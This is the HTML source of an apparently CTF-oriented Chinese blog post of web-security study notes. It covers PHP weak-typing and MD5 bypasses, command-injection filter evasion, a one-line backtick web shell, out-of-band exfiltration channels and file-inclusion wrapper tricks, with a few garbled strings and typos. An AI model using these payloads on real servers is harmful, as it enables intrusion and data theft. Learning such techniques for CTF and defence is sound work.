@@ -1,0 +1,579 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Web安全 | EasyCTF
+</title><meta name=description content="Learning CTF..."><script>window.siteConfig=JSON.parse('{"anchor_icon":null,"clipboard":{"copyright":{"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！","count":50,"enable":false},"fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","success":"复制成功(*^▽^*)"},"code_block":{"expand":true},"icon_font":"4552607_bq08450reo","outdate":{"daysago":180,"enable":false,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"}}')</script><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap" media=print onload='this.media="all"'><link rel=preload href=//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2 as=font type=font/woff2 crossorigin=anonymous><meta property="og:type" content="website"><meta property="og:title" content="Web安全 | EasyCTF"><meta property="og:description" content="Learning CTF..."><meta property="og:url" content="https://example.org/post/web%E5%AE%89%E5%85%A8/"><meta property="og:site_name" content="EasyCTF Blog"><meta property="og:image" content="/"><meta property="article:author" content="EasyCTF"><meta property="article:published_time" content="2025-01-07T21:01:51+08:00"><meta property="article:modified_time" content="2025-01-07T21:01:51+08:00"><meta name=twitter:card content="summary"><meta name=twitter:image content="/"><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/main.min.6ca6f999a78d1f984ffd36d0db179c0960e9a4bf05af6c4e85d60e5a2167ce0c.css><link rel=preload as=style href=https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css onload='this.onload=null,this.rel="stylesheet"'><link rel=preload as=style href=https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css onload='this.onload=null,this.rel="stylesheet"'><script src=https://npm.webcache.cn/pace-js@1.2.4/pace.min.js integrity=sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8 crossorigin=anonymous></script><link rel=stylesheet href=https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css></head><body><div id=copy-tooltip style="pointer-events:none;opacity:0;transition:all .2s ease;position:fixed;top:50%;left:50%;z-index:999;transform:translate(-50%,-50%);color:#fff;background:rgba(0,0,0,.5);padding:10px 15px;border-radius:10px"></div><div id=container><div id=wrap><div id=header-nav><nav id=main-nav><span class=main-nav-link-wrap><div class='main-nav-icon icon rotate'>&#xe62b;</div><a class=main-nav-link href=/>首页</a>
+</span><span class=main-nav-link-wrap><div class='main-nav-icon icon rotate'>&#xe62b;</div><a class=main-nav-link href=/archives>归档</a>
+</span><span class=main-nav-link-wrap><div class='main-nav-icon icon rotate'>&#xe62b;</div><a class=main-nav-link href=/about>关于</a>
+</span><span class=main-nav-link-wrap><div class='main-nav-icon icon rotate'>&#xe62b;</div><a class=main-nav-link href=/friend>友链</a>
+</span><a id=main-nav-toggle class=nav-icon></a></nav><nav id=sub-nav><a id=nav-search-btn class="nav-icon popup-trigger" title=搜索></a></nav></div><header id=header><picture></picture><img fetchpriority=high src=/images/banner.jpg alt=Web安全><div id=header-outer><div id=header-title><a href=/ id=logo><h1 data-aos=slide-up>Web安全</h1></a><h2 id=subtitle-wrap data-aos=slide-down></h2></div></div></header><div id=content class=sidebar-right><aside id=sidebar><div class="sidebar-wrapper wrap-sticky"><div class=sidebar-wrap data-aos=fade-up><div class=sidebar-toc-sidebar><div class=sidebar-toc><h3 class=toc-title>文章目录</h3><div class="sidebar-toc-wrapper toc-div-class"><nav id=TableOfContents><ul><li><a href=#php基本特性>php基本特性</a></li><li><a href=#php的代码执行--rce>PHP的代码执行 RCE</a></li><li><a href=#文件包含>文件包含</a></li><li><a href=#php的文件上传>php的文件上传</a><ul><li><a href=#sql注入的类型>sql注入的类型</a></li></ul></li><li><a href=#序列化基础知识引入>序列化基础知识引入</a><ul><li><a href=#类与对象>类与对象</a></li><li><a href=#php的反序列化漏洞>php的反序列化漏洞</a></li></ul></li></ul></nav></div></div></div><div class="sidebar-common-sidebar hidden"><div class=sidebar-author><img data-src=/avatar/avatar.png data-sizes=auto alt=EasyCTF class=lazyload><div class=sidebar-author-name>EasyCTF</div><div class=sidebar-description>Learning CTF...</div></div><div class=sidebar-state><div class=sidebar-state-article><div>文章</div><div class=sidebar-state-number>5</div></div><div class=sidebar-state-category><div>分类</div><div class=sidebar-state-number>0</div></div><div class=sidebar-state-tag><div>标签</div><div class=sidebar-state-number>0</div></div></div><div class=sidebar-social></div><div class=sidebar-menu><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/ aria-label=首页></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>首页</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/archives aria-label=归档></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>归档</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/about aria-label=关于></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>关于</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/friend aria-label=友链></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>友链</div></div></div></div><div class=sidebar-btn-wrapper style=position:static><div class="sidebar-toc-btn current"></div><div class=sidebar-common-btn></div></div></div></div><div class=sidebar-widget></div></aside><section id=main><article class="h-entry article" itemprop=blogPost itemscope itemtype=https://schema.org/BlogPosting><div class=article-inner data-aos=fade-up><div class=article-meta><div class=article-date><a href=https://example.org/post/web%E5%AE%89%E5%85%A8/ class=article-date-link data-aos=zoom-in><time datetime="2025-01-07 21:01:51 +0800 +0800" itemprop=datePublished>2025-01-07</time>
+<time style=display:none id=post-update-time>2025-01-07</time></a></div><div class=article-category></div></div><div class=hr-line></div><div class="e-content article-entry" itemprop=articleBody><h2 id=php基本特性><a class=header-anchor href=#php%e5%9f%ba%e6%9c%ac%e7%89%b9%e6%80%a7></a>php基本特性</h2><p>弱类型比较</p><blockquote><p>1.字符串和数字比较，字符串会被转换成数字</p><p>&ldquo;admin&rdquo; == 0 true</p><p>admin被转换成数字，由于admin是纯字符串，转换失败 int(admin)=0</p><p>2.混合字符串转换成数字，看字符串的第一个</p><p>&ldquo;1admin&rdquo; == 1 true</p><p>3.字段串开头以xex开头，x代表数字会被转换成科学计数法</p><p>1e9 1x10⁹</p><p>对输入长度限制，又需要＞=很大的值时使用</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$money</span><span class=p>)</span><span class=o>&lt;=</span><span class=mi>4</span><span class=o>&amp;&amp;</span><span class=nv>$money</span><span class=o>&gt;</span><span class=nx>time</span><span class=p>()</span><span class=o>&amp;&amp;!</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$money</span><span class=p>))</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span></code></pre></div><p>a和b的md5值前两位是==0e开头== xex 变成科学技术法</p><p>==QNKCDZO 和 240610708==</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;b&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$b</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;b&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$a</span><span class=o>==</span><span class=nv>$b</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;&lt;center&gt;Wrong Answer!&lt;/center&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span><span class=o>==</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$b</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;&lt;center&gt;&#34;</span><span class=o>.</span><span class=nv>$flag</span><span class=o>.</span><span class=s2>&#34;&lt;/center&gt;&#34;</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span> <span class=k>echo</span> <span class=s2>&#34;&lt;center&gt;Wrong Answer!&lt;/center&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>常用的MD5加密后以0E开头的有
+</span></span><span class=line><span class=cl>    QNKCDZO
+</span></span><span class=line><span class=cl>    240610708
+</span></span><span class=line><span class=cl>    byGcY
+</span></span><span class=line><span class=cl>    sonZ7y
+</span></span><span class=line><span class=cl>    aabg7XSs
+</span></span><span class=line><span class=cl>    aabC9RqS
+</span></span><span class=line><span class=cl>    s878926199a
+</span></span><span class=line><span class=cl>    s155964671a
+</span></span><span class=line><span class=cl>    s214587387a
+</span></span><span class=line><span class=cl>    s1091221200a
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>读字符串的函数，使用数组为被读为NULL</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;flag.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;v1&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;v2&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;v3&#39;</span><span class=p>])</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$v1</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;v1&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$v2</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;v2&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$v3</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;v3&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$v1</span><span class=o>!=</span><span class=nv>$v2</span><span class=o>&amp;&amp;</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$v1</span><span class=p>)</span><span class=o>==</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$v2</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>strcmp</span><span class=p>(</span><span class=nv>$v3</span><span class=p>,</span> <span class=nv>$flag</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><blockquote><p>数组传参?v1[]=1&amp;v2[]=2&amp;v3[]=3</p></blockquote><p>extract — 从数组中读值导出成变量</p><p>trim - 去掉首尾空格回车</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;extract_flag.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>extract</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$aurora</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=p>{</span> 
+</span></span><span class=line><span class=cl>    <span class=nv>$content</span><span class=o>=</span><span class=nx>trim</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$flag</span><span class=p>));</span> 
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$aurora</span><span class=o>==</span><span class=nv>$content</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>     <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>    <span class=p>}</span> 
+</span></span><span class=line><span class=cl><span class=k>else</span> <span class=p>{</span> <span class=k>echo</span><span class=s1>&#39;Oh.no&#39;</span><span class=p>;</span> <span class=p>}</span> <span class=p>}</span><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><blockquote><p>aurora&amp;flag 传空值 $aurora为空&$flag为空</p></blockquote><p>strpos函数选择字符串strpos(a,b);</p><blockquote><p>在a中寻找b，找到为true，否则为false 能看见%00后面的东西</p></blockquote><p>ereg(&rsquo;^[a-zA-Z0-9]+$&rsquo;,$_GET[&lsquo;password&rsquo;])</p><blockquote><p>字符串满足前面的格式返回true，否则为false</p><p>&lsquo;\0&rsquo; %00 截断 只能看见%00前面的东西</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;strpos_flag.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>ereg</span> <span class=p>(</span><span class=s2>&#34;^[a-zA-Z0-9]+$&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=o>===</span> <span class=k>FALSE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;You password must be alphanumeric&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>],</span> <span class=s1>&#39;--&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>FALSE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=k>die</span><span class=p>(</span><span class=s1>&#39;Flag: &#39;</span> <span class=o>.</span> <span class=nv>$flag</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>else</span>
+</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;Invalid password&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>数组绕过 password[]=1 为NULL和FALSE做比较</p><p>or</p><p>password=123%00&ndash;</p><h2 id=php的代码执行--rce><a class=header-anchor href=#php%e7%9a%84%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c--rce></a>PHP的代码执行 RCE</h2><p>Remote Command Exec</p><p>Command指操作系统的命令</p><p>system
+passthru
+exec
+shell_exec
+popen
+pcntl_exec</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>执行运算符 ` （shell_exec） // cat `echo &#39;xxxx&#39; | base64 -d`
+</span></span></code></pre></div><p>绕过方式</p><p>1 替换法 不让用cat 我们用tac
+2 通配符 使用* 或者? 匹配敏感字符
+3 整天编码解码法 cat <code>echo 'xxxx' | base64 -d</code>
+4 关键字拼接法 a=c;b=at;c=fla;d=g.php $a$b $c$d; //cat flag.php
+5 符号过滤突破 空格 可以使用 读取时 使用&lt;> ，使用${IFS}代替空格 ，特殊符号代替空格 %09 %0a %0b %0c
+6 环境变量字符串截取法 获取敏感字符 ${变量名:索引:步长}</p><p>​ 列如：${PHP_EXTRA_CONFIGURE_ARGS:12:1}</p><p>Remote Code Exec</p><p>Code指脚本语言(php)的代码</p><p>eval
+总结：eval(字符串) 表示将字符串按照php的代码执行</p><p>call_user_func</p><p>call_user_func_array</p><p>php动态函数调用</p><p>命令执行和代码执行的区别
+前者执行操作系统命令 或者执行 脚本语言的代码</p><p>函数返回值 函数名字(函数参数);</p><p>$ret = system(&ldquo;calc&rdquo;);</p><p>1 危险函数利用</p><p>2 过滤了黑名单</p><p>如果仅仅在代码中过滤了函数名称，那么大概率就等于 没过滤</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=sb>`$_GET[2]`</span><span class=p>;</span><span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?=`$_GET[2]`;?&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?=`$_GET[2]`;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?`$_GET[2]`;
+</span></span></span></code></pre></div><p>无回显情况下的命令执行</p><p>通道</p><p>数据传输的路径</p><p>shell_exec</p><p>system 相比，没有回显结果</p><ol><li><p>写入文件、二次返回</p></li><li><p>DNS信道</p></li></ol><p>$flag=&ldquo;fla</p><p>JGZsYWc9ImZsYWd7MWE1MzFkNTUtMGRhNS00ODkzRhNS00ODkzLWE5ZWQtZD
+ZsYWd7MWE1MzFkNTUtMGRhNS00ODkzRhNS00ODkzLWE5ZWQtZD
+RhNS00ODkzLWE5ZWQtZD</p><p>3 http信道</p><p>4 反弹shell信道</p><p>公网IP</p><p>5 延时 sleep 3</p><h2 id=文件包含><a class=header-anchor href=#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab></a>文件包含</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>nclude和eval的区别</span>
+</span></span><span class=line><span class=cl><span class=n>include和eval一样</span><span class=err>，都不是函数，都是语言结构，无法通过配置文件的数禁用来禁用</span>
+</span></span><span class=line><span class=cl><span class=n>include</span> <span class=err>后面跟</span> <span class=err>一个站径，表示要执行的</span><span class=n>php文件的路径</span> <span class=err>读取路径中文件内容后，然后执行里面的</span><span class=n>php代码而eval</span> <span class=err>后面跟</span> <span class=n>php的代码</span><span class=err>，表示要执行的</span><span class=n>php代码</span>
+</span></span><span class=line><span class=cl><span class=n>php的常见文件包含函数</span><span class=err>、语言结构</span>
+</span></span><span class=line><span class=cl><span class=n>include</span> <span class=err>仅仅是包含这个文件，如果文件不存在，那么也没啥大不了，继续执行后面代码</span>
+</span></span><span class=line><span class=cl><span class=n>require</span> <span class=err>必须给老子包含好这个文件，如果没包含好，我就摆烂不执行了，报错</span>
+</span></span><span class=line><span class=cl><span class=n>include_once</span> <span class=err>包合一次</span> <span class=err>遇到错误继续执行</span>
+</span></span><span class=line><span class=cl><span class=n>requine_once</span> <span class=err>成功包含一次，遇到错误停止</span>
+</span></span><span class=line><span class=cl><span class=n>include</span> <span class=s2>&#34;flag.php&#34;</span>
+</span></span><span class=line><span class=cl><span class=err>文件包含漏洞，是指，通过文件包含时，包含的内容我们用户可控</span>
+</span></span><span class=line><span class=cl><span class=n>php伪协议</span>
+</span></span><span class=line><span class=cl><span class=mi>1</span> <span class=err>什么是协议?</span>
+</span></span><span class=line><span class=cl><span class=err>网络层协议</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>IP协议</span>
+</span></span><span class=line><span class=cl><span class=n>ICMP协议</span>
+</span></span><span class=line><span class=cl><span class=n>ARP协议</span>
+</span></span><span class=line><span class=cl><span class=n>IGMP协议</span>
+</span></span><span class=line><span class=cl><span class=err>应用层协议</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>http协议</span>
+</span></span><span class=line><span class=cl><span class=n>https协议</span>
+</span></span><span class=line><span class=cl><span class=n>ftp协议</span>
+</span></span><span class=line><span class=cl><span class=n>ssh协议</span>
+</span></span><span class=line><span class=cl><span class=n>gopher</span>
+</span></span><span class=line><span class=cl><span class=n>qq拉起协议</span>  <span class=n>tencent</span><span class=p>:</span><span class=o>//</span><span class=n>qq</span><span class=o>/</span><span class=n>go123</span> <span class=err>交给专门的应用来处理，应用指本地程序</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>2</span> <span class=err>协议的格式</span>
+</span></span><span class=line><span class=cl><span class=err>协议头</span><span class=p>:</span><span class=o>//</span><span class=err>内容</span>
+</span></span><span class=line><span class=cl><span class=mi>3</span> <span class=n>php中的协议</span>
+</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>//</span><span class=err>—访问本地文件系统</span>
+</span></span><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=err>—访问</span><span class=n>HTTP</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>网址</span>
+</span></span><span class=line><span class=cl><span class=n>ftp</span><span class=p>:</span><span class=o>//</span> <span class=err>—</span> <span class=err>访问</span> <span class=n>FTP</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>URLs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>php</span><span class=p>:</span><span class=o>//</span> <span class=err>—访问各个输入</span><span class=o>/</span><span class=err>输出流</span><span class=p>(</span><span class=n>I</span><span class=o>/</span><span class=n>O</span> <span class=n>system</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>zlib</span><span class=p>:</span><span class=o>//</span><span class=err>—压缩流</span>
+</span></span><span class=line><span class=cl><span class=n>data</span><span class=p>:</span><span class=o>//</span> <span class=err>—</span> <span class=err>数据</span> <span class=p>(</span><span class=n>RFC</span> <span class=mi>2397</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>glob</span><span class=p>:</span><span class=o>//</span><span class=err>—查找匹配的文件路径模式</span>
+</span></span><span class=line><span class=cl><span class=n>phar</span><span class=p>:</span><span class=o>//</span><span class=err>—</span><span class=n>PHP归档</span>
+</span></span><span class=line><span class=cl><span class=n>ssh2</span><span class=p>:</span><span class=o>/</span><span class=n>l</span><span class=err>—</span><span class=n>Secure</span> <span class=n>Shell</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=n>rar</span><span class=o>//</span><span class=err>—</span><span class=n>RAR</span>
+</span></span><span class=line><span class=cl><span class=n>ogg</span><span class=o>//</span> <span class=err>—</span> <span class=err>音频流</span>
+</span></span><span class=line><span class=cl><span class=n>expect</span><span class=p>:</span><span class=o>//</span> <span class=err>—处理交互式的流</span>
+</span></span><span class=line><span class=cl><span class=err>常用的协议</span>
+</span></span><span class=line><span class=cl><span class=n>file协议</span>
+</span></span><span class=line><span class=cl><span class=err>不写协议名称，就默认认为是</span><span class=n>file协议</span>
+</span></span><span class=line><span class=cl><span class=err>相对路径和绝对路径</span>
+</span></span><span class=line><span class=cl><span class=err>相对路径转了绝对路径</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>.</span><span class=n>php</span> <span class=n>index</span><span class=o>.</span><span class=n>php</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span> <span class=n>include</span> <span class=s2>&#34;flag.php&#34;</span> 
+</span></span><span class=line><span class=cl><span class=n>include</span> <span class=s2>&#34;file:///var/www/htm1/flag.phe&#34;</span><span class=n>include</span> <span class=s2>&#34;flag,php&#34;</span><span class=err>；</span>
+</span></span><span class=line><span class=cl><span class=n>include</span><span class=s2>&#34;../html/flag.php&#34;</span><span class=err>；</span> <span class=err>“</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/../</span><span class=n>html</span><span class=o>/</span><span class=n>flag</span><span class=o>.</span><span class=n>php</span><span class=err>”</span>
+</span></span><span class=line><span class=cl><span class=err>上层目录特性</span>
+</span></span><span class=line><span class=cl><span class=mi>1</span> <span class=err>每个目录都有上层目录</span>
+</span></span><span class=line><span class=cl><span class=mi>2</span> <span class=err>根目录的上层目录是根目录本身</span>
+</span></span><span class=line><span class=cl><span class=n>php目录整理特性</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mw</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>ctfshow</span><span class=o>/../</span><span class=n>flag</span><span class=o>.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>flag</span><span class=o>.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>三元表达式</span>
+</span></span><span class=line><span class=cl><span class=n>A</span><span class=err>?</span><span class=n>B</span><span class=p>:</span><span class=n>C</span>
+</span></span><span class=line><span class=cl><span class=err>如果</span><span class=n>A成立</span><span class=err>，返回</span><span class=n>B的结果</span><span class=err>，否则返回</span><span class=n>C的结果</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>http协议</span>
+</span></span><span class=line><span class=cl><span class=err>配合文件包含，可以读取远程的</span><span class=n>php代码并在本地执行</span><span class=err>，实现了最终</span><span class=n>RCE的效果</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ftp协议</span>
+</span></span><span class=line><span class=cl><span class=err>默认</span><span class=mi>21</span><span class=err>端口，进行文件传输的协议</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>php协议</span>
+</span></span><span class=line><span class=cl><span class=n>php</span><span class=p>:</span><span class=o>//</span><span class=n>input</span>
+</span></span><span class=line><span class=cl><span class=n>php</span><span class=p>:</span><span class=o>//</span><span class=n>filter</span>
+</span></span><span class=line><span class=cl><span class=err>绕过死亡</span><span class=n>die</span>
+</span></span><span class=line><span class=cl><span class=n>php</span><span class=p>:</span><span class=o>//</span><span class=n>filter</span><span class=o>/</span><span class=n>wirte</span><span class=o>=</span><span class=n>string</span><span class=o>.</span><span class=n>rot13</span><span class=o>/</span><span class=n>resource</span><span class=o>=</span><span class=err>文件名</span>
+</span></span><span class=line><span class=cl><span class=n>php的文件上传机制</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>_GET</span> <span class=o>$</span><span class=n>_POST</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>_SERVER</span> <span class=o>$</span><span class=n>_COOKIE</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>_SESSION</span> <span class=o>$</span><span class=n>_FILES</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>phpxxxxxX</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=err>???</span><span class=o>/</span><span class=err>????????</span><span class=p>[</span><span class=err>@</span><span class=o>-</span><span class=p>[]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>data协议</span>
+</span></span><span class=line><span class=cl><span class=n>data</span><span class=p>:</span><span class=o>//</span><span class=n>text</span><span class=o>/</span><span class=n>plain</span><span class=p>,</span><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span> <span class=err>?</span><span class=o>&gt;</span>
